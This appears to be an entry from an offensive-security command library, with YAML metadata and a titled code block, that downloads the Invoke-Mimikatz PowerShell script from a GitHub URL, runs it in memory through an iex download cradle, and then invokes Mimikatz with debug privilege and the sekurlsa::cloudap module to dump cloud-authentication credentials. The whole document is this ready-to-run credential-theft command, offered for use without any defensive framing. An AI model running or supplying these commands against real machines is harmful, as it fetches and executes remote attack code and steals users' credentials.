---
id: ad951666-589a-4b7d-a6d0-c5403be2b230
name: Download and launch Mimikatz with Powershell
type: command
executor: bash
data: 'PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")

  PS> Invoke-Mimikatz -Command ''"privilege::debug" "sekurlsa::cloudap"'''
output: null
created_at: '2023-05-25T16:44:24.679558+00:00'
updated_at: '2023-05-25T17:03:04.299543+00:00'
---

# Download and launch Mimikatz with Powershell

```bash
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```


